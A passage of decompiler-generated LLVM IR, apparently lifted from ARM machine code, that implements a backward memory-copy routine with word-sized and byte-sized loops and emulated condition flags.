  %v0_153b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_153b8 = inttoptr i32 %v0_153b8 to i32*
  %v2_153b8 = load i32, i32* %v1_153b8, align 4
  store i32 %v2_153b8, i32* %lr.global-to-local, align 4
  %v4_153b8 = add i32 %v0_153b8, 4
  store i32 %v4_153b8, i32* %r1.global-to-local, align 4
  %v4_153bc = mul i32 %v2_153b8, 256
  %v5_153bc = or i32 %v4_153bc, %v3_153b4
  store i32 %v5_153bc, i32* @ip, align 4
  %v2_153c0 = inttoptr i32 %v1_153c0 to i32*
  store i32 %v5_153bc, i32* %v2_153c0, align 4
  %v3_153c0 = load i32, i32* @r0, align 4
  %v4_153c0 = add i32 %v3_153c0, 4
  store i32 %v4_153c0, i32* @r0, align 4
  %v0_153c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_153c4 = add i32 %v0_153c4, -4
  store i32 %v1_153c4, i32* %r2.global-to-local, align 4
  %v3_153c4 = sub i32 3, %v0_153c4
  %v4_153c4 = and i32 %v3_153c4, %v0_153c4
  %v5_153c4 = icmp slt i32 %v4_153c4, 0
  %v6_153c4 = icmp slt i32 %v1_153c4, 0
  %v2_153c8 = xor i1 %v6_153c4, %v5_153c4
  br i1 %v2_153c8, label %dec_label_pc_153cc.loopexit, label %dec_label_pc_153b4

dec_label_pc_153cc.loopexit:                      ; preds = %dec_label_pc_153b4
  %v7_153c4 = icmp eq i32 %v0_153c4, 4
  store i1 %v5_153c4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_153c4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_153c4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_153cc

dec_label_pc_153cc:                               ; preds = %dec_label_pc_153cc.loopexit, %dec_label_pc_153a8
  %v0_1521c61 = phi i32 [ %v1_153c4, %dec_label_pc_153cc.loopexit ], [ %v1_153ac, %dec_label_pc_153a8 ]
  %v0_153cc = load i32, i32* %r1.global-to-local, align 4
  %v1_153cc = add i32 %v0_153cc, -1
  store i32 %v1_153cc, i32* @r1, align 4
  br label %bb140

dec_label_pc_153d4:                               ; preds = %dec_label_pc_15180
  %v1_153d4 = load i32, i32* @r2, align 4
  %v2_153d4 = add i32 %v1_153d4, %v0_15180
  store i32 %v2_153d4, i32* %r1.global-to-local, align 4
  %v2_153d8 = add i32 %v1_153d4, %v1_15180
  store i32 %v2_153d8, i32* %r0.global-to-local, align 4
  %v2_153dc = add i32 %v1_153d4, -4
  store i32 %v2_153dc, i32* %r2.global-to-local, align 4
  %v4_153dc = sub i32 3, %v1_153d4
  %v5_153dc = and i32 %v4_153dc, %v1_153d4
  %v6_153dc = icmp slt i32 %v5_153dc, 0
  store i1 %v6_153dc, i1* %cpsr_v.global-to-local, align 1
  %v7_153dc = icmp slt i32 %v2_153dc, 0
  store i1 %v7_153dc, i1* %cpsr_n.global-to-local, align 1
  %v8_153dc = icmp eq i32 %v1_153d4, 4
  store i1 %v8_153dc, i1* %cpsr_z.global-to-local, align 1
  %v5_153e0 = icmp slt i32 %v1_153d4, 4
  br i1 %v5_153e0, label %bb150, label %dec_label_pc_153e4

dec_label_pc_153e4:                               ; preds = %dec_label_pc_153d4
  %v1_153e4 = urem i32 %v2_153d8, 4
  store i32 %v1_153e4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_153e4 = icmp eq i32 %v1_153e4, 0
  store i1 %v2_153e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_153e4, label %dec_label_pc_153ec, label %dec_label_pc_1548c

dec_label_pc_153ec:                               ; preds = %dec_label_pc_153e4
  %v1_153ec = urem i32 %v2_153d4, 4
  store i32 %v1_153ec, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_153ec = icmp eq i32 %v1_153ec, 0
  store i1 %v2_153ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_153ec, label %dec_label_pc_153f4, label %dec_label_pc_154b8

dec_label_pc_153f4:                               ; preds = %dec_label_pc_153ec, %dec_label_pc_154b0
  %v0_1540c37 = phi i32 [ %v2_153d8, %dec_label_pc_153ec ], [ %v0_1550020, %dec_label_pc_154b0 ]
  %v0_1540836 = phi i32 [ %v2_153d4, %dec_label_pc_153ec ], [ %v0_154b0, %dec_label_pc_154b0 ]
  %v0_153f4 = phi i32 [ %v2_153dc, %dec_label_pc_153ec ], [ %v2_154a8, %dec_label_pc_154b0 ]
  %v2_153f4 = add i32 %v0_153f4, -8
  store i32 %v2_153f4, i32* %r2.global-to-local, align 4
  %v4_153f4 = sub i32 7, %v0_153f4
  %v5_153f4 = and i32 %v4_153f4, %v0_153f4
  %v6_153f4 = icmp slt i32 %v5_153f4, 0
  store i1 %v6_153f4, i1* %cpsr_v.global-to-local, align 1
  %v7_153f4 = icmp slt i32 %v2_153f4, 0
  store i1 %v7_153f4, i1* %cpsr_n.global-to-local, align 1
  %v8_153f4 = icmp eq i32 %v0_153f4, 8
  store i1 %v8_153f4, i1* %cpsr_z.global-to-local, align 1
  %v5_153f8 = icmp slt i32 %v0_153f4, 8
  br i1 %v5_153f8, label %dec_label_pc_15444, label %dec_label_pc_153fc

dec_label_pc_153fc:                               ; preds = %dec_label_pc_153f4
  %v3_153fc = load i32, i32* @r4, align 4
  %v5_153fc = inttoptr i32 %v3_153fc to i8*
  store i8* %v5_153fc, i8** %stack_var_-8, align 4
  %v8_153fc = load i32, i32* @lr, align 4
  %v2_15400 = add i32 %v0_153f4, -28
  store i32 %v2_15400, i32* %r2.global-to-local, align 4
  %v4_15400 = sub i32 27, %v0_153f4
  %v5_15400 = and i32 %v4_15400, %v2_153f4
  %v6_15400 = icmp slt i32 %v5_15400, 0
  store i1 %v6_15400, i1* %cpsr_v.global-to-local, align 1
  %v7_15400 = icmp slt i32 %v2_15400, 0
  store i1 %v7_15400, i1* %cpsr_n.global-to-local, align 1
  %v8_15400 = icmp eq i32 %v2_153f4, 20
  store i1 %v8_15400, i1* %cpsr_z.global-to-local, align 1
  %v5_15404 = icmp slt i32 %v2_153f4, 20
  br i1 %v5_15404, label %dec_label_pc_15420, label %dec_label_pc_15408

dec_label_pc_15408:                               ; preds = %dec_label_pc_153fc, %dec_label_pc_15408.dec_label_pc_15408_crit_edge
  %v0_1540c = phi i32 [ %v1_15414, %dec_label_pc_15408.dec_label_pc_15408_crit_edge ], [ %v0_1540c37, %dec_label_pc_153fc ]
  %v0_15408 = phi i32 [ %v0_15408.pre, %dec_label_pc_15408.dec_label_pc_15408_crit_edge ], [ %v0_1540836, %dec_label_pc_153fc ]
  %v1_15408 = add i32 %v0_15408, -4
  %v2_15408 = inttoptr i32 %v1_15408 to i32*
  %v3_15408 = load i32, i32* %v2_15408, align 4
  %v4_15408 = add i32 %v0_15408, -8
  %v5_15408 = inttoptr i32 %v4_15408 to i32*
  %v6_15408 = load i32, i32* %v5_15408, align 4
  store i32 %v6_15408, i32* %r4.global-to-local, align 4
  %v7_15408 = add i32 %v0_15408, -12
  %v8_15408 = inttoptr i32 %v7_15408 to i32*
  %v9_15408 = load i32, i32* %v8_15408, align 4
  store i32 %v9_15408, i32* %ip.global-to-local, align 4
  %v10_15408 = add i32 %v0_15408, -16
  %v11_15408 = inttoptr i32 %v10_15408 to i32*
  %v12_15408 = load i32, i32* %v11_15408, align 4
  store i32 %v12_15408, i32* %lr.global-to-local, align 4
  store i32 %v10_15408, i32* %r1.global-to-local, align 4
  %v1_1540c = add i32 %v0_1540c, -16
  %v2_1540c = inttoptr i32 %v1_1540c to i32*
  store i32 %v3_15408, i32* %v2_1540c, align 4
  %v4_1540c = add i32 %v0_1540c, -12
  %v5_1540c = inttoptr i32 %v4_1540c to i32*
  %v6_1540c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1540c, i32* %v5_1540c, align 4
  %v7_1540c = add i32 %v0_1540c, -8
  %v8_1540c = inttoptr i32 %v7_1540c to i32*
  %v9_1540c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1540c, i32* %v8_1540c, align 4
  %v10_1540c = add i32 %v0_1540c, -4
  %v11_1540c = inttoptr i32 %v10_1540c to i32*
  %v12_1540c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1540c, i32* %v11_1540c, align 4
  store i32 %v1_1540c, i32* %r0.global-to-local, align 4
  %v0_15410 = load i32, i32* %r1.global-to-local, align 4
  %v1_15410 = add i32 %v0_15410, -4
  %v2_15410 = inttoptr i32 %v1_15410 to i32*
  %v3_15410 = load i32, i32* %v2_15410, align 4
  store i32 %v3_15410, i32* @r3, align 4
  %v4_15410 = add i32 %v0_15410, -8
  %v5_15410 = inttoptr i32 %v4_15410 to i32*
  %v6_15410 = load i32, i32* %v5_15410, align 4
  store i32 %v6_15410, i32* %r4.global-to-local, align 4
  %v7_15410 = add i32 %v0_15410, -12
  %v8_15410 = inttoptr i32 %v7_15410 to i32*
  %v9_15410 = load i32, i32* %v8_15410, align 4
  store i32 %v9_15410, i32* @ip, align 4
  %v10_15410 = add i32 %v0_15410, -16
  %v11_15410 = inttoptr i32 %v10_15410 to i32*
  %v12_15410 = load i32, i32* %v11_15410, align 4
  store i32 %v12_15410, i32* %lr.global-to-local, align 4
  store i32 %v10_15410, i32* %r1.global-to-local, align 4
  %v1_15414 = add i32 %v0_1540c, -32
  %v2_15414 = inttoptr i32 %v1_15414 to i32*
  store i32 %v3_15410, i32* %v2_15414, align 4
  %v4_15414 = add i32 %v0_1540c, -28
  %v5_15414 = inttoptr i32 %v4_15414 to i32*
  %v6_15414 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15414, i32* %v5_15414, align 4
  %v7_15414 = add i32 %v0_1540c, -24
  %v8_15414 = inttoptr i32 %v7_15414 to i32*
  %v9_15414 = load i32, i32* @ip, align 4
  store i32 %v9_15414, i32* %v8_15414, align 4
  %v10_15414 = add i32 %v0_1540c, -20
  %v11_15414 = inttoptr i32 %v10_15414 to i32*
  %v12_15414 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15414, i32* %v11_15414, align 4
  store i32 %v1_15414, i32* %r0.global-to-local, align 4
  %v0_15418 = load i32, i32* %r2.global-to-local, align 4
  %v2_15418 = add i32 %v0_15418, -32
  store i32 %v2_15418, i32* %r2.global-to-local, align 4
  %v6_1541c = icmp slt i32 %v0_15418, 32
  br i1 %v6_1541c, label %dec_label_pc_15420.loopexit, label %dec_label_pc_15408.dec_label_pc_15408_crit_edge

dec_label_pc_15408.dec_label_pc_15408_crit_edge:  ; preds = %dec_label_pc_15408
  %v0_15408.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15408

dec_label_pc_15420.loopexit:                      ; preds = %dec_label_pc_15408
  %v4_15418 = sub i32 31, %v0_15418
  %v5_15418 = and i32 %v4_15418, %v0_15418
  %v6_15418 = icmp slt i32 %v5_15418, 0
  %v7_15418 = icmp slt i32 %v2_15418, 0
  store i1 %v6_15418, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15418, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15420

dec_label_pc_15420:                               ; preds = %dec_label_pc_15420.loopexit, %dec_label_pc_153fc
  %v6_15428 = phi i32 [ %v1_15414, %dec_label_pc_15420.loopexit ], [ %v0_1540c37, %dec_label_pc_153fc ]
  %v0_15430.pr = phi i32 [ %v2_15418, %dec_label_pc_15420.loopexit ], [ %v2_15400, %dec_label_pc_153fc ]
  %v4_15420 = add i32 %v0_15430.pr, 16
  %v6_15420 = sub i32 0, %v0_15430.pr
  %v7_15420 = and i32 %v4_15420, %v6_15420
  %v8_15420 = icmp slt i32 %v7_15420, 0
  store i1 %v8_15420, i1* %cpsr_v.global-to-local, align 1
  %v9_15420 = icmp slt i32 %v4_15420, 0
  store i1 %v9_15420, i1* %cpsr_n.global-to-local, align 1
  %v10_15420 = icmp eq i32 %v4_15420, 0
  store i1 %v10_15420, i1* %cpsr_z.global-to-local, align 1
  %v5_15424 = icmp slt i32 %v0_15430.pr, -16
  br i1 %v5_15424, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_15420
  %v6_15424 = load i32, i32* %r1.global-to-local, align 4
  %v7_15424 = add i32 %v6_15424, -4
  %v8_15424 = inttoptr i32 %v7_15424 to i32*
  %v9_15424 = load i32, i32* %v8_15424, align 4
  store i32 %v9_15424, i32* @r3, align 4
  %v10_15424 = add i32 %v6_15424, -8
  %v11_15424 = inttoptr i32 %v10_15424 to i32*
  %v12_15424 = load i32, i32* %v11_15424, align 4
  store i32 %v12_15424, i32* %r4.global-to-local, align 4
  %v13_15424 = add i32 %v6_15424, -12
  %v14_15424 = inttoptr i32 %v13_15424 to i32*
  %v15_15424 = load i32, i32* %v14_15424, align 4
  store i32 %v15_15424, i32* @ip, align 4
  %v16_15424 = add i32 %v6_15424, -16
  %v17_15424 = inttoptr i32 %v16_15424 to i32*
  %v18_15424 = load i32, i32* %v17_15424, align 4
  store i32 %v18_15424, i32* %lr.global-to-local, align 4
  store i32 %v16_15424, i32* %r1.global-to-local, align 4
  %v7_15428 = add i32 %v6_15428, -16
  %v8_15428 = inttoptr i32 %v7_15428 to i32*
  store i32 %v9_15424, i32* %v8_15428, align 4
  %v10_15428 = add i32 %v6_15428, -12
  %v11_15428 = inttoptr i32 %v10_15428 to i32*
  %v12_15428 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_15428, i32* %v11_15428, align 4
  %v13_15428 = add i32 %v6_15428, -8
  %v14_15428 = inttoptr i32 %v13_15428 to i32*
  %v15_15428 = load i32, i32* @ip, align 4
  store i32 %v15_15428, i32* %v14_15428, align 4
  %v16_15428 = add i32 %v6_15428, -4
  %v17_15428 = inttoptr i32 %v16_15428 to i32*
  %v18_15428 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_15428, i32* %v17_15428, align 4
  store i32 %v7_15428, i32* %r0.global-to-local, align 4
  %v6_1542c = load i32, i32* %r2.global-to-local, align 4
  %v7_1542c = add i32 %v6_1542c, -16
  store i32 %v7_1542c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15420, %bb147
  %v6_15438 = phi i32 [ %v7_15428, %bb147 ], [ %v6_15428, %dec_label_pc_15420 ]
  %v0_15430 = phi i32 [ %v7_1542c, %bb147 ], [ %v0_15430.pr, %dec_label_pc_15420 ]
  %v4_15430 = add i32 %v0_15430, 20
  store i32 %v4_15430, i32* %r2.global-to-local, align 4
  %v6_15430 = sub i32 0, %v0_15430
  %v7_15430 = and i32 %v4_15430, %v6_15430
  %v8_15430 = icmp slt i32 %v7_15430, 0
  store i1 %v8_15430, i1* %cpsr_v.global-to-local, align 1
  %v9_15430 = icmp slt i32 %v4_15430, 0
  store i1 %v9_15430, i1* %cpsr_n.global-to-local, align 1
  %v10_15430 = icmp eq i32 %v4_15430, 0
  store i1 %v10_15430, i1* %cpsr_z.global-to-local, align 1
  %v5_15434 = icmp slt i32 %v0_15430, -20
  br i1 %v5_15434, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_15434 = load i32, i32* %r1.global-to-local, align 4
  %v7_15434 = add i32 %v6_15434, -4
  %v8_15434 = inttoptr i32 %v7_15434 to i32*
  %v9_15434 = load i32, i32* %v8_15434, align 4
  store i32 %v9_15434, i32* @r3, align 4
  %v10_15434 = add i32 %v6_15434, -8
  %v11_15434 = inttoptr i32 %v10_15434 to i32*
  %v12_15434 = load i32, i32* %v11_15434, align 4
  store i32 %v12_15434, i32* @ip, align 4
  %v13_15434 = add i32 %v6_15434, -12
  %v14_15434 = inttoptr i32 %v13_15434 to i32*
  %v15_15434 = load i32, i32* %v14_15434, align 4
  store i32 %v15_15434, i32* %lr.global-to-local, align 4
  store i32 %v13_15434, i32* %r1.global-to-local, align 4
  %v7_15438 = add i32 %v6_15438, -12
  %v8_15438 = inttoptr i32 %v7_15438 to i32*
  store i32 %v9_15434, i32* %v8_15438, align 4
  %v10_15438 = add i32 %v6_15438, -8
  %v11_15438 = inttoptr i32 %v10_15438 to i32*
  %v12_15438 = load i32, i32* @ip, align 4
  store i32 %v12_15438, i32* %v11_15438, align 4
  %v13_15438 = add i32 %v6_15438, -4
  %v14_15438 = inttoptr i32 %v13_15438 to i32*
  %v15_15438 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_15438, i32* %v14_15438, align 4
  store i32 %v7_15438, i32* %r0.global-to-local, align 4
  %v6_1543c = load i32, i32* %r2.global-to-local, align 4
  %v7_1543c = add i32 %v6_1543c, -12
  store i32 %v7_1543c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_1545c45 = phi i32 [ %v6_15438, %.thread2 ], [ %v7_15438, %bb148 ]
  %v0_1544443 = phi i32 [ %v4_15430, %.thread2 ], [ %v7_1543c, %bb148 ]
  %v2_15440 = load i8*, i8** %stack_var_-8, align 4
  %v3_15440 = ptrtoint i8* %v2_15440 to i32
  store i32 %v3_15440, i32* @r4, align 4
  store i32 %v8_153fc, i32* @lr, align 4
  br label %dec_label_pc_15444

dec_label_pc_15444:                               ; preds = %dec_label_pc_153f4, %.thread4
  %v7_15454 = phi i32 [ %v0_1540c37, %dec_label_pc_153f4 ], [ %v6_1545c45, %.thread4 ]
  %v0_15444 = phi i32 [ %v2_153f4, %dec_label_pc_153f4 ], [ %v0_1544443, %.thread4 ]
  %v2_15444 = add i32 %v0_15444, 8
  store i32 %v2_15444, i32* %r2.global-to-local, align 4
  %v4_15444 = sub i32 0, %v0_15444
  %v5_15444 = and i32 %v2_15444, %v4_15444
  %v6_15444 = icmp slt i32 %v5_15444, 0
  store i1 %v6_15444, i1* %cpsr_v.global-to-local, align 1
  %v7_15444 = icmp slt i32 %v2_15444, 0
  store i1 %v7_15444, i1* %cpsr_n.global-to-local, align 1
  %v8_15444 = icmp eq i32 %v2_15444, 0
  store i1 %v8_15444, i1* %cpsr_z.global-to-local, align 1
  %v5_15448 = icmp slt i32 %v0_15444, -8
  br i1 %v5_15448, label %bb150, label %dec_label_pc_1544c

dec_label_pc_1544c:                               ; preds = %dec_label_pc_15444
  %v6_1544c = add i32 %v0_15444, 4
  store i32 %v6_1544c, i32* %r2.global-to-local, align 4
  %v8_1544c = sub i32 -5, %v0_15444
  %v9_1544c = and i32 %v8_1544c, %v2_15444
  %v10_1544c = icmp slt i32 %v9_1544c, 0
  store i1 %v10_1544c, i1* %cpsr_v.global-to-local, align 1
  %v11_1544c = icmp slt i32 %v6_1544c, 0
  store i1 %v11_1544c, i1* %cpsr_n.global-to-local, align 1
  %v12_1544c = icmp eq i32 %v2_15444, 4
  store i1 %v12_1544c, i1* %cpsr_z.global-to-local, align 1
  %v5_15450 = icmp slt i32 %v2_15444, 4
  %v6_15450 = load i32, i32* %r1.global-to-local, align 4
  %v7_15450 = add i32 %v6_15450, -4
  %v8_15450 = inttoptr i32 %v7_15450 to i32*
  %v9_15450 = load i32, i32* %v8_15450, align 4
  store i32 %v9_15450, i32* @r3, align 4
  br i1 %v5_15450, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_1544c
  store i32 %v7_15450, i32* %r1.global-to-local, align 4
  %v8_15454 = add i32 %v7_15454, -4
  %v9_15454 = inttoptr i32 %v8_15454 to i32*
  store i32 %v9_15450, i32* %v9_15454, align 4
  %v10_15454 = load i32, i32* %r0.global-to-local, align 4
  %v11_15454 = add i32 %v10_15454, -4
  store i32 %v11_15454, i32* %r0.global-to-local, align 4
  %v0_15464.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1544c
  %v10_15458 = add i32 %v6_15450, -8
  %v11_15458 = inttoptr i32 %v10_15458 to i32*
  %v12_15458 = load i32, i32* %v11_15458, align 4
  store i32 %v12_15458, i32* @ip, align 4
  store i32 %v10_15458, i32* %r1.global-to-local, align 4
  %v7_1545c = add i32 %v7_15454, -8
  %v8_1545c = inttoptr i32 %v7_1545c to i32*
  store i32 %v9_15450, i32* %v8_1545c, align 4
  %v10_1545c = add i32 %v7_15454, -4
  %v11_1545c = inttoptr i32 %v10_1545c to i32*
  %v12_1545c = load i32, i32* @ip, align 4
  store i32 %v12_1545c, i32* %v11_1545c, align 4
  store i32 %v7_1545c, i32* %r0.global-to-local, align 4
  %v6_15460 = load i32, i32* %r2.global-to-local, align 4
  %v7_15460 = add i32 %v6_15460, -4
  store i32 %v7_15460, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %dec_label_pc_15444, %dec_label_pc_153d4, %.thread14, %dec_label_pc_15608, %dec_label_pc_1559c, %dec_label_pc_15530, %bb149
  %v2_15468 = phi i32 [ %v11_15454, %.thread8 ], [ %v7_15454, %dec_label_pc_15444 ], [ %v2_153d8, %dec_label_pc_153d4 ], [ %v0_1550020, %.thread14 ], [ %v2_1547453, %dec_label_pc_15608 ], [ %v2_1547452, %dec_label_pc_1559c ], [ %v2_1547451, %dec_label_pc_15530 ], [ %v7_1545c, %bb149 ]
  %v0_15464 = phi i32 [ %v0_15464.pre, %.thread8 ], [ %v2_15444, %dec_label_pc_15444 ], [ %v2_153dc, %dec_label_pc_153d4 ], [ %v2_154a8, %.thread14 ], [ %v0_1546449, %dec_label_pc_15608 ], [ %v0_1546448, %dec_label_pc_1559c ], [ %v0_1546447, %dec_label_pc_15530 ], [ %v7_15460, %bb149 ]
  %v1_15464 = add i32 %v0_15464, 4
  store i32 %v1_15464, i32* %r2.global-to-local, align 4
  %v3_15464 = sub i32 0, %v0_15464
  %v4_15464 = and i32 %v1_15464, %v3_15464
  %v5_15464 = icmp slt i32 %v4_15464, 0
  store i1 %v5_15464, i1* %cpsr_v.global-to-local, align 1
  %v6_15464 = icmp slt i32 %v1_15464, 0
  store i1 %v6_15464, i1* %cpsr_n.global-to-local, align 1
  %v7_15464 = icmp eq i32 %v1_15464, 0
  store i1 %v7_15464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15464, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1546c = add i32 %v0_15464, 2
  %v3_1546c = sub i32 -3, %v0_15464
  %v4_1546c = and i32 %v3_1546c, %v1_15464
  %v5_1546c = icmp slt i32 %v4_1546c, 0
  store i1 %v5_1546c, i1* %cpsr_v.global-to-local, align 1
  %v6_1546c = icmp slt i32 %v1_1546c, 0
  store i1 %v6_1546c, i1* %cpsr_n.global-to-local, align 1
  %v7_1546c = icmp eq i32 %v1_15464, 2
  store i1 %v7_1546c, i1* %cpsr_z.global-to-local, align 1
  %v0_15470 = load i32, i32* %r1.global-to-local, align 4
  %v1_15470 = add i32 %v0_15470, -1
  %v2_15470 = inttoptr i32 %v1_15470 to i8*
  %v3_15470 = load i8, i8* %v2_15470, align 1
  %v4_15470 = zext i8 %v3_15470 to i32
  store i32 %v4_15470, i32* @r3, align 4
  store i32 %v1_15470, i32* %r1.global-to-local, align 4
  %v3_15474 = add i32 %v2_15468, -1
  %v4_15474 = inttoptr i32 %v3_15474 to i8*
  store i8 %v3_15470, i8* %v4_15474, align 1
  %v5_15474 = load i32, i32* %r0.global-to-local, align 4
  %v6_15474 = add i32 %v5_15474, -1
  store i32 %v6_15474, i32* %r0.global-to-local, align 4
  %v0_15478 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15478 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15478 = xor i1 %v0_15478, %v1_15478
  br i1 %v2_15478, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_15478 = load i32, i32* %r1.global-to-local, align 4
  %v4_15478 = add i32 %v3_15478, -1
  %v5_15478 = inttoptr i32 %v4_15478 to i8*
  %v6_15478 = load i8, i8* %v5_15478, align 1
  %v7_15478 = zext i8 %v6_15478 to i32
  store i32 %v7_15478, i32* @r3, align 4
  store i32 %v4_15478, i32* %r1.global-to-local, align 4
  %v6_1547c = add i32 %v5_15474, -2
  %v7_1547c = inttoptr i32 %v6_1547c to i8*
  store i8 %v6_15478, i8* %v7_1547c, align 1
  %v8_1547c = load i32, i32* %r0.global-to-local, align 4
  %v9_1547c = add i32 %v8_1547c, -1
  store i32 %v9_1547c, i32* %r0.global-to-local, align 4
  %v1_15480.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15480.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_15484 = phi i32 [ %v9_1547c, %bb152 ], [ %v6_15474, %bb151 ]
  %v2_15484 = phi i1 [ %v2_15480.pre, %bb152 ], [ %v1_15478, %bb151 ]
  %v1_15484 = phi i1 [ %v1_15480.pre, %bb152 ], [ %v0_15478, %bb151 ]
  %v0_15480 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_15480 = xor i1 %v2_15484, %v1_15484
  %v4_15480 = or i1 %v0_15480, %v3_15480
  br i1 %v4_15480, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_15480 = load i32, i32* %r1.global-to-local, align 4
  %v6_15480 = add i32 %v5_15480, -1
  %v7_15480 = inttoptr i32 %v6_15480 to i8*
  %v8_15480 = load i8, i8* %v7_15480, align 1
  %v9_15480 = zext i8 %v8_15480 to i32
  store i32 %v9_15480, i32* @r3, align 4
  store i32 %v6_15480, i32* %r1.global-to-local, align 4
  %v8_15484 = add i32 %v7_15484, -1
  %v9_15484 = inttoptr i32 %v8_15484 to i8*
  store i8 %v8_15480, i8* %v9_15484, align 1
  %v10_15484 = load i32, i32* %r0.global-to-local, align 4
  %v11_15484 = add i32 %v10_15484, -1
  store i32 %v11_15484, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_1548c:                               ; preds = %dec_label_pc_153e4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1548c = icmp eq i32 %v1_153e4, 1
  store i1 %v8_1548c, i1* %cpsr_n.global-to-local, align 1
  %v9_1548c = icmp eq i32 %v1_153e4, 2
  store i1 %v9_1548c, i1* %cpsr_z.global-to-local, align 1
  %v1_15490 = add i32 %v2_153d4, -1
  %v2_15490 = inttoptr i32 %v1_15490 to i8*
  %v3_15490 = load i8, i8* %v2_15490, align 1
  %v4_15490 = zext i8 %v3_15490 to i32
  store i32 %v4_15490, i32* @r3, align 4
  store i32 %v1_15490, i32* %r1.global-to-local, align 4
  %v3_15494 = add i32 %v2_153d8, -1
  %v4_15494 = inttoptr i32 %v3_15494 to i8*
  store i8 %v3_15490, i8* %v4_15494, align 1
  %v5_15494 = load i32, i32* %r0.global-to-local, align 4
  %v6_15494 = add i32 %v5_15494, -1
  store i32 %v6_15494, i32* %r0.global-to-local, align 4
  br i1 %v8_1548c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_1548c
  %v6_15498 = load i32, i32* %r1.global-to-local, align 4
  %v7_15498 = add i32 %v6_15498, -1
  %v8_15498 = inttoptr i32 %v7_15498 to i8*
  %v9_15498 = load i8, i8* %v8_15498, align 1
  %v10_15498 = zext i8 %v9_15498 to i32
  store i32 %v10_15498, i32* @r3, align 4
  store i32 %v7_15498, i32* %r1.global-to-local, align 4
  %v9_1549c = add i32 %v5_15494, -2
  %v10_1549c = inttoptr i32 %v9_1549c to i8*
  store i8 %v9_15498, i8* %v10_1549c, align 1
  %v11_1549c = load i32, i32* %r0.global-to-local, align 4
  %v12_1549c = add i32 %v11_1549c, -1
  store i32 %v12_1549c, i32* %r0.global-to-local, align 4
  br i1 %v9_1548c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_154a0 = load i32, i32* %r1.global-to-local, align 4
  %v9_154a0 = add i32 %v8_154a0, -1
  %v10_154a0 = inttoptr i32 %v9_154a0 to i8*
  %v11_154a0 = load i8, i8* %v10_154a0, align 1
  %v12_154a0 = zext i8 %v11_154a0 to i32
  store i32 %v12_154a0, i32* @r3, align 4
  store i32 %v9_154a0, i32* %r1.global-to-local, align 4
  %v11_154a4 = add i32 %v11_1549c, -2
  %v12_154a4 = inttoptr i32 %v11_154a4 to i8*
  store i8 %v11_154a0, i8* %v12_154a4, align 1
  %v13_154a4 = load i32, i32* %r0.global-to-local, align 4
  %v14_154a4 = add i32 %v13_154a4, -1
  store i32 %v14_154a4, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_1548c, %bb155
  %v0_1550020 = phi i32 [ %v12_1549c, %bb154 ], [ %v6_15494, %dec_label_pc_1548c ], [ %v14_154a4, %bb155 ]
  %v0_154a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_154a8 = load i32, i32* @ip, align 4
  %v2_154a8 = sub i32 %v0_154a8, %v1_154a8
  store i32 %v2_154a8, i32* %r2.global-to-local, align 4
  %v4_154a8 = xor i32 %v1_154a8, %v0_154a8
  %v5_154a8 = xor i32 %v2_154a8, %v0_154a8
  %v6_154a8 = and i32 %v5_154a8, %v4_154a8
  %v7_154a8 = icmp slt i32 %v6_154a8, 0
  store i1 %v7_154a8, i1* %cpsr_v.global-to-local, align 1
  %v8_154a8 = icmp slt i32 %v2_154a8, 0
  store i1 %v8_154a8, i1* %cpsr_n.global-to-local, align 1
  %v9_154a8 = icmp eq i32 %v0_154a8, %v1_154a8
  store i1 %v9_154a8, i1* %cpsr_z.global-to-local, align 1
  %v5_154ac = icmp slt i32 %v0_154a8, %v1_154a8
  br i1 %v5_154ac, label %bb150, label %dec_label_pc_154b0

dec_label_pc_154b0:                               ; preds = %.thread14
  %v0_154b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_154b0 = urem i32 %v0_154b0, 4
